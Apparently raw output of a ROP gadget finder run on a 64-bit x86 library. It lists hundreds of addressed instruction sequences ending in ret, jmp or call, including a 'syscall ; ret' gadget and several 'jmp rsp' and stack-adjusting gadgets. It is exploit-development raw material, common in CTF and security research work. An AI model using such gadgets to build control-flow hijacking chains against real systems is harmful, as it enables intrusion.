0x00002aaaaabd6eca : imul eax ; fcomp st(1) ; int1 ; dec dword ptr [rcx - 0x75] ; jge 0x101ede ; call rbx
0x00002aaaaabd8ac3 : imul eax ; fistp qword ptr [rbp - 0x74b6000f] ; jge 0x103ad7 ; call rbx
0x00002aaaaabd8c06 : imul eax ; pushfq ; mov esp, 0x8b49fff1 ; jge 0x103c1a ; call rbx
0x00002aaaaabd2fd8 : imul eax ; ret 0xf6f7
0x00002aaaaabd8d07 : imul eax ; wait ; mov ebx, 0x8b49fff1 ; jge 0x103d1b ; call rbx
0x00002aaaaabd700d : imul eax ; xchg eax, ebp ; fdiv st(1) ; dec dword ptr [rcx - 0x75] ; jge 0x102021 ; call rbx
0x00002aaaaabbf357 : imul eax, dword ptr [rax], 0x440f0000 ; ret 0xa6e9
0x00002aaaaac6ad15 : imul eax, dword ptr [rax], 0xe9710400 ; jmp rsp
0x00002aaaaac7688d : imul eax, dword ptr [rax], 0xed012000 ; call qword ptr [rsi]
0x00002aaaaab9c339 : imul eax, dword ptr [rbp + 0x1f0ffff5], 0 ; pop rbx ; ret
0x00002aaaaac33987 : imul eax, dword ptr [rbx], 0 ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac44d91 : imul eax, dword ptr [rcx], 0 ; add dh, dh ; ret 0x7502
0x00002aaaaab2af36 : imul eax, dword ptr [rcx], 0x7e8b4d00 ; and byte ptr [rax + 1], cl ; ret
0x00002aaaaab91786 : imul eax, dword ptr [rdi], 0 ; add byte ptr [rax + 1], cl ; ret
0x00002aaaaab91a3f : imul eax, dword ptr [rdi], 0 ; add byte ptr [rax + 1], cl ; ret 0x8d48
0x00002aaaaab5c551 : imul eax, dword ptr [rdx], 0 ; add byte ptr [rax - 0x77], cl ; fisttp word ptr [rcx + rcx*4 - 6] ; call rax
0x00002aaaaac4285a : imul eax, dword ptr [rdx], 0 ; movsxd rcx, dword ptr [r11 + rdx*4] ; add rcx, r11 ; jmp rcx
0x00002aaaaaba4607 : imul eax, dword ptr [rdx], 0x75c08500 ; ret 0x858b
0x00002aaaaab091e7 : imul eax, dword ptr [rip + 0x5c8d4c00], 0x89480005 ; ret 0x394d
0x00002aaaaab52396 : imul ebx, dword ptr [rax], -0x70 ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabe30f5 : imul ebx, dword ptr [rax], 0x48 ; add esp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab4c9c4 : imul ebx, dword ptr [rax], 0x4c ; mov eax, esp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabd6e39 : imul ebx, edx, -0xf ; dec dword ptr [rcx - 0x75] ; call rbx
0x00002aaaaab5dca6 : imul ecx, dword ptr [rax], -0x48 ; add dword ptr [rax], eax ; add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabe3095 : imul ecx, dword ptr [rax], 0x48 ; add esp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab5db4a : imul ecx, dword ptr [rax], 0x48 ; mov dword ptr [rbx], edx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab80f4e : imul ecx, dword ptr [rcx], 0xf3b60f00 ; mov rdi, qword ptr [rbp] ; call r12
0x00002aaaaab882fc : imul ecx, dword ptr [rdx], 0 ; add byte ptr [rax - 0x48], cl ; ret 0xffff
0x00002aaaaac6c6c1 : imul edi ; inc dword ptr [rax + rcx - 0x4cbffff] ; out dx, eax ; call rsp
0x00002aaaaabe2fcf : imul edi, dword ptr [rax], 0x48 ; mov eax, ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac5e34c : imul edi, dword ptr [rbx - 0xb], -1 ; jnp 0x18934f ; call rsi
0x00002aaaaac5ecc4 : imul edi, dword ptr [rdx - 0xa], -1 ; scasb al, byte ptr [rdi] ; jns 0x189cc8 ; jmp qword ptr [rdx]
0x00002aaaaab7476b : imul edi, dword ptr [rdx], 0x394c0032 ; ret 0x830f
0x00002aaaaab4b770 : imul edi, ebp, 0x89c085ff ; ret
0x00002aaaaab9ead3 : imul edi, edi, 0x3c6ffff ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaabf5aa1 : imul edi, esi, 0x8348ffff ; ret
0x00002aaaaabe30c5 : imul edx, dword ptr [rax], 0x48 ; add esp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab0f733 : imul edx, dword ptr [rdx + 0x38], 0x58d4800 ; ret 0x386a
0x00002aaaaabd2a01 : imul edx, ecx, -8 ; dec dword ptr [rax - 0x73] ; adc cl, byte ptr [rax - 0x77] ; ret 0x8948
0x00002aaaaaad7b84 : imul edx, edx, 0x3a ; adc al, 0xe7 ; ret
0x00002aaaaaad8aa0 : imul esi ; in eax, 0x78 ; mov dl, 0x1e ; ret
0x00002aaaaab90b14 : imul esi, esi, 0x3c ; add eax, esi ; ret
0x00002aaaaac122a1 : imul esp, dword ptr [rbx], 0 ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab7a05c : imul esp, dword ptr [rsi + 0xf], 0x74 ; ret 0xff3
0x00002aaaaac8ef1c : in al, -0x11 ; add dword ptr [rax], eax ; rcl byte ptr [rdx], 0xf8 ; jmp qword ptr [rbx]
0x00002aaaaaad8794 : in al, -0x12 ; jne 0x3776 ; ret 0x975
0x00002aaaaac6fb50 : in al, -0x2a ; cli ; call rsp
0x00002aaaaac7ca1c : in al, -0x36 ; add byte ptr [rax], al ; add byte ptr [rbp - 0x10], dl ; call qword ptr [rax]
0x00002aaaaac6e55c : in al, -0x3d ; add dword ptr [rax], eax ; test ah, dh ; idiv edi ; cld ; ret
0x00002aaaaac5ced4 : in al, -0x45 ; call qword ptr [rdx]
0x00002aaaaac7ba1c : in al, -0x46 ; add byte ptr [rax], al ; sal byte ptr [rbp - 0x11], 1 ; jmp qword ptr [rax]
0x00002aaaaac6bb20 : in al, -0x46 ; in eax, dx ; push qword ptr [rsp + rdi*4 - 0x446c0000] ; in eax, dx ; call rsp
0x00002aaaaac6b9c0 : in al, -0x75 ; in eax, dx ; push qword ptr [rcx + rsi*4 - 0x739c0000] ; in eax, dx ; jmp rsp
0x00002aaaaab6ed6d : in al, -0x7d ; ret 0x480f
0x00002aaaaac6dda8 : in al, -0xa ; idiv bh ; movsb byte ptr [rdi], byte ptr [rsi] ; popfq ; add dword ptr [rax], eax ; push rsp ; div esi ; call rsp
0x00002aaaaac2f0fa : in al, -0xd ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaab6373b : in al, -0xd ; ret
0x00002aaaaac7a2b1 : in al, -4 ; call qword ptr [rdx]
0x00002aaaaac696ad : in al, -5 ; inc dword ptr [rax + 0x40fffbd7] ; fsincos ; jmp qword ptr [rax]
0x00002aaaaac696cd : in al, -5 ; inc dword ptr [rax - 0x29] ; sti ; inc dword ptr [rax] ; fsincos ; jmp rax
0x00002aaaaac6e4f9 : in al, -9 ; inc esp ; ret 1
0x00002aaaaac6e519 : in al, -9 ; jmp qword ptr [rbx + rax*8]
0x00002aaaaac6e509 : in al, -9 ; push rsp ; ret 1
0x00002aaaaac46c58 : in al, 0 ; add byte ptr [rax], al ; ret
0x00002aaaaabdbc01 : in al, 0 ; add byte ptr [rax], al ; syscall ; ret
0x00002aaaaac6c1a5 : in al, 0 ; add byte ptr [rdx + rsi*2], al ; out dx, al ; call rsp
0x00002aaaaac6df40 : in al, 0x12 ; idiv edi ; mov esp, 0x140001a3 ; adc esi, edi ; call rsp
0x00002aaaaac6e858 : in al, 0x1d ; clc ; jmp qword ptr [rsp + rdx*8 + 1]
0x00002aaaaab84401 : in al, 0x31 ; test byte ptr [rcx - 0x48], 0x40 ; add byte ptr [rax], al ; add byte ptr [rcx - 0x77], cl ; ret
0x00002aaaaab59c63 : in al, 0x33 ; add byte ptr [rbp - 0xcf98740], al ; ret
0x00002aaaaab7307b : in al, 0x41 ; cmp eax, ecx ; je 0x9e067 ; ret
0x00002aaaaac6cec8 : in al, 0x46 ; jmp rsp
0x00002aaaaac6fa64 : in al, 0x57 ; add al, byte ptr [rax] ; push rsp ; ret
0x00002aaaaac6ca28 : in al, 0x74 ; int1 ; jmp rsp
0x00002aaaaab5debc : in al, 0x74 ; or dword ptr [rax - 1], ecx ; ret 0xc148
0x00002aaaaab7edae : in al, 0x75 ; adc byte ptr [rbx - 0x6bf0fd06], al ; ret 0x8444
0x00002aaaaab80996 : in al, 0x75 ; test al, 0xf0 ; jne 0xab9fb ; lea rax, qword ptr [rdi - 0x10] ; ret
0x00002aaaaab215b4 : in al, 0xf ; lahf ; ret
0x00002aaaaab25300 : in al, 0xf ; test byte ptr [rcx - 0x77000000], dh ; ret 0xe283
0x00002aaaaabf9ada : in al, 0xf ; test dh, bh ; add al, byte ptr [rax] ; add byte ptr [rcx], bh ; ret
0x00002aaaaac6ea85 : in al, 1 ; add byte ptr [rbp - 8], ah ; jmp rsp
0x00002aaaaac2b4f6 : in al, 3 ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab7ab98 : in al, 6 ; add byte ptr [rax], al ; ret
0x00002aaaaac6d180 : in al, 6 ; hlt ; inc dword ptr [rdx + rdx*2 + 0x8040001] ; hlt ; call rsp
0x00002aaaaac81124 : in al, dx ; adc dword ptr [rcx], eax ; add al, bl ; fpatan ; call qword ptr [rbx]
0x00002aaaaabf26f2 : in al, dx ; adc eax, dword ptr [rdi] ; add byte ptr [rax - 0x77], cl ; ret 0xff31
0x00002aaaaabc5711 : in al, dx ; add byte ptr [rax + rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab4d0be : in al, dx ; add byte ptr [rax], 0 ; add al, ch ; clc ; ret
0x00002aaaaac0b2c3 : in al, dx ; add byte ptr [rax], 0 ; add al, ch ; ret
0x00002aaaaab921f4 : in al, dx ; add byte ptr [rax], 0 ; add al, ch ; ret 0x572
0x00002aaaaab54ef4 : in al, dx ; add byte ptr [rax], 0 ; add al, ch ; ret 0x945
0x00002aaaaabf86f4 : in al, dx ; add byte ptr [rax], 0 ; add al, ch ; ret 0xff0d
0x00002aaaaac7ebb5 : in al, dx ; add byte ptr [rax], al ; or byte ptr [rbx], al ; call rdi
0x00002aaaaab39329 : in al, dx ; add dword ptr [rax + 1], ecx ; ret
0x00002aaaaab91e40 : in al, dx ; add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab58f08 : in al, dx ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x00002aaaaab215b0 : in al, dx ; add dword ptr [rbp - 0x7b], eax ; in al, 0xf ; lahf ; ret
0x00002aaaaac19850 : in al, dx ; add eax, 0x83480000 ; ret 0xeb10
0x00002aaaaac2ad16 : in al, dx ; add eax, dword ptr [rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac84e24 : in al, dx ; add qword ptr [rax], r8 ; or byte ptr [rdi - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac75a3a : in al, dx ; call qword ptr [rax]
0x00002aaaaac75a82 : in al, dx ; call rsp
0x00002aaaaaba5b43 : in al, dx ; cmp al, 0x3f ; jne 0xd0b0f ; mov eax, 1 ; ret
0x00002aaaaabfce7e : in al, dx ; cmp byte ptr [rax - 1], 0x5b ; pop rbp ; pop r12 ; ret
0x00002aaaaab09f99 : in al, dx ; fld xword ptr [rsp - 0x18] ; fld st(0) ; fstp xword ptr [rdi] ; fsubp st(1) ; ret
0x00002aaaaab1f219 : in al, dx ; fld xword ptr [rsp - 0x18] ; ret
0x00002aaaaac83399 : in al, dx ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac5b245 : in al, dx ; in eax, dx ; inc dword ptr [rcx] ; out dx, eax ; in eax, dx ; inc dword ptr [rcx] ; out dx, eax ; in eax, dx ; jmp qword ptr [rax]
0x00002aaaaac5c22d : in al, dx ; int1 ; call qword ptr [rax]
0x00002aaaaac5c25d : in al, dx ; int1 ; call rax
0x00002aaaaac5c269 : in al, dx ; int1 ; inc dword ptr [rax] ; in eax, dx ; int1 ; call qword ptr [rax]
0x00002aaaaac5c259 : in al, dx ; int1 ; inc eax ; in al, dx ; int1 ; call rax
0x00002aaaaac5c231 : in al, dx ; int1 ; jmp qword ptr [rax]
0x00002aaaaac5c261 : in al, dx ; int1 ; jmp rax
0x00002aaaaac5c255 : in al, dx ; int1 ; push qword ptr [rax - 0x3f000e14] ; in al, dx ; int1 ; call rax
0x00002aaaaac5c265 : in al, dx ; int1 ; push rax ; in al, dx ; int1 ; inc dword ptr [rax] ; in eax, dx ; int1 ; call qword ptr [rax]
0x00002aaaaac7543a : in al, dx ; jmp qword ptr [rcx]
0x00002aaaaac7576a : in al, dx ; jmp rax
0x00002aaaaac7588a : in al, dx ; jmp rbx
0x00002aaaaabd3733 : in al, dx ; mov byte ptr [r8 - 1], 0 ; ret
0x00002aaaaabd8ab8 : in al, dx ; mov ebp, 0x8b49fff1 ; call rbx
0x00002aaaaac2741a : in al, dx ; mov qword ptr [rdi - 0xc], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaab73173 : in al, dx ; mov qword ptr [rdx], rcx ; ret
0x00002aaaaac0eeb4 : in al, dx ; mov rax, qword ptr [rdi + 8] ; mov rax, qword ptr [rax] ; jmp rax
0x00002aaaaac2f4fa : in al, dx ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaab738d1 : in al, dx ; or al, ch ; cwde ; ret 0xfffe
0x00002aaaaab1ab5c : in al, dx ; or al, ch ; lea ebp, dword ptr [rdi - 2] ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaabff4a1 : in al, dx ; or al, ch ; mov byte ptr [rbx - 0x11], dl ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaac0034a : in al, dx ; or al, ch ; out dx, eax ; ret 0
0x00002aaaaab42cd6 : in al, dx ; or al, ch ; ret
0x00002aaaaab42dd3 : in al, dx ; or byte ptr [rax - 0x75], cl ; mov edi, 0xe0 ; call rax
0x00002aaaaab574f7 : in al, dx ; or byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x00002aaaaac1a574 : in al, dx ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaac120ed : in al, dx ; or byte ptr [rbx - 0x6bf0f502], al ; ret
0x00002aaaaabcb612 : in al, dx ; or dh, dh ; ret 0x7540
0x00002aaaaab4a8b3 : in al, dx ; or dword ptr [rax], eax ; add rsp, 0x80 ; ret
0x00002aaaaac86f24 : in al, dx ; outsd dx, dword ptr [rsi] ; add dword ptr [rax], eax ; clc ; sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaac78f24 : in al, dx ; pop qword ptr [rax] ; add al, bl ; mov ebp, gs ; jmp qword ptr [rax]
0x00002aaaaac85624 : in al, dx ; push rsi ; add dword ptr [rax], eax ; js 0x1b06ac ; cmc ; jmp qword ptr [rcx]
0x00002aaaaab72f7b : in al, dx ; ret
0x00002aaaaac71c24 : in al, dx ; sbb al, 0 ; add byte ptr [rax], bl ; cmp ch, cl ; call qword ptr [rsi]
0x00002aaaaabebcd2 : in al, dx ; sbb byte ptr [rax + 0xf], cl ; scasd eax, dword ptr [rdi] ; jmp 0x76d3a62c
0x00002aaaaabcb291 : in al, dx ; sbb byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x00002aaaaaad75ab : in al, dx ; scasd eax, dword ptr [rdi] ; xchg eax, esi ; add byte ptr [rdx], al ; xchg dh, ch ; ret 0x88ad
0x00002aaaaac8fd24 : in al, dx ; std ; add dword ptr [rax], eax ; push rsp ; clc ; jmp qword ptr [rcx]
0x00002aaaaac6991d : in al, dx ; sti ; call qword ptr [rax - 0x1f000413]
0x00002aaaaac7ab24 : in al, dx ; stosd dword ptr [rdi], eax ; add byte ptr [rax], al ; test al, 0x73 ; out dx, al ; jmp qword ptr [rdx]
0x00002aaaaaad878d : in al, dx ; xchg eax, ebx ; mov ch, 0xb7 ; cli ; add ebx, ebp ; in al, -0x12 ; jne 0x377d ; ret 0x975
0x00002aaaaac59c7e : in al, dx ; xchg eax, esp ; push rsi ; cli ; push 0x6e ; ja 0x184c11 ; ret 0x48f
0x00002aaaaac59c7d : in al, dx ; xchg eax, esp ; push rsi ; cli ; push 0x6e ; ja 0x184c12 ; ret 0x48f
0x00002aaaaac11120 : in al, dx ; xor al, 0 ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaac03c13 : in al, dx ; xor dh, dh ; ret 0xc707
0x00002aaaaac71081 : in eax, -0x18 ; call qword ptr [rdx]
0x00002aaaaac5a239 : in eax, -0x1e ; add ch, byte ptr [ebp + ebp*2 + 0x5b] ; ret 0x6f9
0x00002aaaaab0a185 : in eax, -0x21 ; loopne 0x35170 ; fsub dword ptr [rip + 0x200] ; ret
0x00002aaaaab27fc3 : in eax, -0x21 ; loopne 0x52f54 ; ret 0xe680
0x00002aaaaab29f3c : in eax, -0x21 ; loopne 0x54ecd ; ret 0xe680
0x00002aaaaabd6ebf : in eax, -0x27 ; int1 ; dec dword ptr [rcx - 0x75] ; call rbx
0x00002aaaaabad5f3 : in eax, -0x77 ; ret
0x00002aaaaac2f17a : in eax, -0xd ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaab6893a : in eax, -0xd ; ret
0x00002aaaaac801c1 : in eax, -0xe ; call qword ptr [rsi]
0x00002aaaaabcfadf : in eax, -1 ; dec dword ptr [rcx + 0x458949ef] ; or al, ch ; ret
0x00002aaaaac59701 : in eax, -1 ; lahf ; mov dh, 0xc7 ; ret 0xe71f
0x00002aaaaac6962d : in eax, -5 ; jmp qword ptr [rax]
0x00002aaaaac6966d : in eax, -5 ; jmp rax
0x00002aaaaac7e505 : in eax, 0 ; add byte ptr [rax - 0x17], bl ; int1 ; jmp qword ptr [rdi]
0x00002aaaaaaf59aa : in eax, 0 ; add byte ptr [rax], al ; add rsp, 0x98 ; ret
0x00002aaaaac58383 : in eax, 0x24 ; outsd dx, dword ptr es:[rsi] ; ret 0x5ae4
0x00002aaaaabbc8b4 : in eax, 0x2d ; add byte ptr [rax], al ; je 0xe78f8 ; xor eax, eax ; ret
0x00002aaaaabfea26 : in eax, 0x41 ; call rdi
0x00002aaaaab6387a : in eax, 0x48 ; mov eax, edi ; ret
0x00002aaaaab1f6f2 : in eax, 0x48 ; mov eax, esi ; ret
0x00002aaaaabe9de5 : in eax, 0x5d ; ret
0x00002aaaaac57619 : in eax, 0x6a ; mov eax, 0x45155e93 ; ret 0x591c
0x00002aaaaac07af2 : in eax, 0x74 ; sub eax, 0x8948f631 ; out -0x77, eax ; ret
0x00002aaaaaad8aa2 : in eax, 0x78 ; mov dl, 0x1e ; ret
0x00002aaaaab80383 : in eax, 0xf ; je 0xab3a8 ; add rax, 2 ; ret
0x00002aaaaac6eaad : in eax, 1 ; add byte ptr [rcx + rbp*2], dh ; clc ; call rsp
0x00002aaaaac2b3a6 : in eax, 3 ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab85942 : in eax, 6 ; add byte ptr [rax], al ; test ebp, ebp ; mov r13, r15 ; setne dl ; jmp 0xb0963
0x00002aaaaac0411e : in eax, dx ; adc byte ptr [rcx - 0x7d], cl ; ret 0x8320
0x00002aaaaab83021 : in eax, dx ; add al, byte ptr [rax] ; add byte ptr [rbp - 0x276b213], al ; setne dl ; jmp 0xae043
0x00002aaaaabc7d12 : in eax, dx ; add al, byte ptr [rax] ; add byte ptr [rcx - 0x75], cl ; push rbp ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab4b52f : in eax, dx ; add byte ptr [rax], r8b ; mov edx, eax ; jmp 0x764d4
0x00002aaaaab83bb0 : in eax, dx ; add dword ptr [rax - 0x77], ecx ; fisttp qword ptr [rax - 0x77] ; ret
0x00002aaaaab862c0 : in eax, dx ; add dword ptr [rcx + 0xf], eax ; xchg eax, ebp ; ret 0x2041
0x00002aaaaab226cf : in eax, dx ; add eax, 0xf8834800 ; dec dword ptr [rcx - 0x77] ; ret
0x00002aaaaac2ac6a : in eax, dx ; add eax, dword ptr [rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac5b37a : in eax, dx ; call qword ptr [rax]
0x00002aaaaac78a1a : in eax, dx ; call qword ptr [rcx]
0x00002aaaaac7907a : in eax, dx ; call qword ptr [rdx]
0x00002aaaaac76892 : in eax, dx ; call qword ptr [rsi]
0x00002aaaaac5acbe : in eax, dx ; call rdx
0x00002aaaaac76cba : in eax, dx ; call rsi
0x00002aaaaac6ba6a : in eax, dx ; call rsp
0x00002aaaaab1f5b9 : in eax, dx ; cmp rdi, rsi ; mov rax, rsi ; cmovae rax, rdi ; ret
0x00002aaaaac17bdc : in eax, dx ; dec dword ptr [rbx + 0x480c2444] ; add esp, 0x38 ; ret
0x00002aaaaac5acb6 : in eax, dx ; dec edx ; push 0x65f7ffed ; in eax, dx ; call rdx
0x00002aaaaac5aca2 : in eax, dx ; dec edx ; push 0x68caffed ; in eax, dx ; jmp qword ptr [rdx]
0x00002aaaaac6bc0a : in eax, dx ; dec esp ; rol dword ptr [rax], 0 ; and al, 0xd4 ; in eax, dx ; jmp rsp
0x00002aaaaac6b8b2 : in eax, dx ; dec esp ; test eax, 0x59440000 ; in eax, dx ; jmp rsp
0x00002aaaaac5b379 : in eax, dx ; in eax, dx ; call qword ptr [rax]
0x00002aaaaac5b375 : in eax, dx ; in eax, dx ; inc dword ptr [rbx - 0x13] ; in eax, dx ; call qword ptr [rax]
0x00002aaaaac6ba2a : in eax, dx ; inc dword ptr [rbp + rsi*4 - 0x5f4c0000] ; in eax, dx ; jmp rsp
0x00002aaaaac5b376 : in eax, dx ; inc dword ptr [rbx - 0x13] ; in eax, dx ; call qword ptr [rax]
0x00002aaaaac5b1c6 : in eax, dx ; inc dword ptr [rcx] ; out dx, eax ; in eax, dx ; inc dword ptr [rcx] ; out dx, eax ; in eax, dx ; jmp qword ptr [rax]
0x00002aaaaac5b1ca : in eax, dx ; inc dword ptr [rcx] ; out dx, eax ; in eax, dx ; jmp qword ptr [rax]
0x00002aaaaac6bc3a : in eax, dx ; inc esp ; ret 0
0x00002aaaaac5c26d : in eax, dx ; int1 ; call qword ptr [rax]
0x00002aaaaac5c28d : in eax, dx ; int1 ; call rax
0x00002aaaaac5c271 : in eax, dx ; int1 ; jmp qword ptr [rax]
0x00002aaaaac5c291 : in eax, dx ; int1 ; push rax ; in eax, dx ; int1 ; call qword ptr [rax]
0x00002aaaaac5b1ce : in eax, dx ; jmp qword ptr [rax]
0x00002aaaaac78db2 : in eax, dx ; jmp qword ptr [rbx]
0x00002aaaaac7884a : in eax, dx ; jmp qword ptr [rcx]
0x00002aaaaac77b2a : in eax, dx ; jmp qword ptr [rdi]
0x00002aaaaac5acaa : in eax, dx ; jmp qword ptr [rdx]
0x00002aaaaac7809a : in eax, dx ; jmp qword ptr [rsi]
0x00002aaaaac77cb2 : in eax, dx ; jmp rsi
0x00002aaaaac6b8ba : in eax, dx ; jmp rsp
0x00002aaaaabebcf9 : in eax, dx ; jne 0x116d11 ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaabfad79 : in eax, dx ; jne 0x125b91 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac4854f : in eax, dx ; jne 0x173531 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaabc3d3a : in eax, dx ; jne 0xeed2a ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaac6bbaa : in eax, dx ; lcall ptr [rdi + rdi*4 - 0x38bc0000] ; in eax, dx ; call rsp
0x00002aaaaac6b8da : in eax, dx ; lcall ptr [rdx + rbp*4 + 0x5d740000] ; in eax, dx ; jmp rsp
0x00002aaaaab7e7d2 : in eax, dx ; lea rax, qword ptr [rcx - 1] ; ret
0x00002aaaaac6bc32 : in eax, dx ; ljmp ptr [rdx + rax*8 - 0x282c0000] ; in eax, dx ; inc esp ; ret 0
0x00002aaaaab7e199 : in eax, dx ; mov byte ptr [rdi + 0x10], ch ; ret
0x00002aaaaab7e1af : in eax, dx ; mov byte ptr [rdi + 0x11], ch ; ret
0x00002aaaaab7e1d1 : in eax, dx ; mov byte ptr [rdi + 0x12], ch ; ret
0x00002aaaaab7e1ef : in eax, dx ; mov byte ptr [rdi + 0x13], ch ; ret
0x00002aaaaab7e20f : in eax, dx ; mov byte ptr [rdi + 0x14], ch ; ret
0x00002aaaaab7e235 : in eax, dx ; mov byte ptr [rdi + 0x15], ch ; ret
0x00002aaaaab7e251 : in eax, dx ; mov byte ptr [rdi + 0x16], ch ; ret
0x00002aaaaab7e271 : in eax, dx ; mov byte ptr [rdi + 0x17], ch ; ret
0x00002aaaaab7e291 : in eax, dx ; mov byte ptr [rdi + 0x18], ch ; ret
0x00002aaaaab7e2b7 : in eax, dx ; mov byte ptr [rdi + 0x19], ch ; ret
0x00002aaaaab7e2d9 : in eax, dx ; mov byte ptr [rdi + 0x1a], ch ; ret
0x00002aaaaab7e2f7 : in eax, dx ; mov byte ptr [rdi + 0x1b], ch ; ret
0x00002aaaaab7e317 : in eax, dx ; mov byte ptr [rdi + 0x1c], ch ; ret
0x00002aaaaab7e333 : in eax, dx ; mov byte ptr [rdi + 0x1d], ch ; ret
0x00002aaaaab7e353 : in eax, dx ; mov byte ptr [rdi + 0x1e], ch ; ret
0x00002aaaaab7e373 : in eax, dx ; mov byte ptr [rdi + 0x1f], ch ; ret
0x00002aaaaab7e393 : in eax, dx ; mov byte ptr [rdi + 0x20], ch ; ret
0x00002aaaaab7e3b9 : in eax, dx ; mov byte ptr [rdi + 0x21], ch ; ret
0x00002aaaaab7e409 : in eax, dx ; mov byte ptr [rdi + 0x40], ch ; ret
0x00002aaaaab7e0df : in eax, dx ; mov byte ptr [rdi + 0xa], ch ; ret
0x00002aaaaab7e0fd : in eax, dx ; mov byte ptr [rdi + 0xb], ch ; ret
0x00002aaaaab7e11d : in eax, dx ; mov byte ptr [rdi + 0xc], ch ; ret
0x00002aaaaab7e13f : in eax, dx ; mov byte ptr [rdi + 0xd], ch ; ret
0x00002aaaaab7e15f : in eax, dx ; mov byte ptr [rdi + 0xe], ch ; ret
0x00002aaaaab7e17f : in eax, dx ; mov byte ptr [rdi + 0xf], ch ; ret
0x00002aaaaab7e015 : in eax, dx ; mov byte ptr [rdi + 1], ch ; ret
0x00002aaaaab7e027 : in eax, dx ; mov byte ptr [rdi + 2], ch ; ret
0x00002aaaaab7e03d : in eax, dx ; mov byte ptr [rdi + 3], ch ; ret
0x00002aaaaab7e055 : in eax, dx ; mov byte ptr [rdi + 4], ch ; ret
0x00002aaaaab7e06b : in eax, dx ; mov byte ptr [rdi + 5], ch ; ret
0x00002aaaaab7e07d : in eax, dx ; mov byte ptr [rdi + 6], ch ; ret
0x00002aaaaab7e09b : in eax, dx ; mov byte ptr [rdi + 7], ch ; ret
0x00002aaaaab7e0a7 : in eax, dx ; mov byte ptr [rdi + 8], ch ; ret
0x00002aaaaab7e0bd : in eax, dx ; mov byte ptr [rdi + 9], ch ; ret
0x00002aaaaab7e001 : in eax, dx ; mov byte ptr [rdi], ch ; ret
0x00002aaaaac2722a : in eax, dx ; mov qword ptr [rdi - 0xb], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaab83026 : in eax, dx ; mov r13, r15 ; setne dl ; jmp 0xae03e
0x00002aaaaab85947 : in eax, dx ; mov r13, r15 ; setne dl ; jmp 0xb095e
0x00002aaaaab880fe : in eax, dx ; mov r13, r15 ; setne dl ; jmp 0xb311e
0x00002aaaaac2f57a : in eax, dx ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaabadf64 : in eax, dx ; movsxd rdx, dword ptr [rax + rbp*4] ; add rax, rdx ; jmp rax
0x00002aaaaac1e0e0 : in eax, dx ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaab1d76b : in eax, dx ; or byte ptr [rbp + 0x39], cl ; sal dword ptr [rbp + rsi*2 + 0x4c], -0x77 ; ret 0xf749
0x00002aaaaac4898a : in eax, dx ; pop rbx ; ret
0x00002aaaaac6bcf2 : in eax, dx ; push qword ptr [rcx + rcx*8 - 0x3ec0000] ; in eax, dx ; call rsp
0x00002aaaaac6b9c2 : in eax, dx ; push qword ptr [rcx + rsi*4 - 0x739c0000] ; in eax, dx ; jmp rsp
0x00002aaaaac6b91a : in eax, dx ; push qword ptr [rsp + rbp*4 + 0x77040000] ; in eax, dx ; jmp rsp
0x00002aaaaac6bb22 : in eax, dx ; push qword ptr [rsp + rdi*4 - 0x446c0000] ; in eax, dx ; call rsp
0x00002aaaaac5acba : in eax, dx ; push rdi ; in eax, dx ; call rdx
0x00002aaaaab46c02 : in eax, dx ; ret
0x00002aaaaab2e86f : in eax, dx ; ret 0x12
0x00002aaaaac69921 : in eax, dx ; sti ; jmp rax
0x00002aaaaab7e922 : in eax, dx ; sub rax, 1 ; ret
0x00002aaaaab0fdaa : in eax, dx ; xor eax, eax ; add rsp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab730ba : in eax, dx ; xor eax, eax ; ret
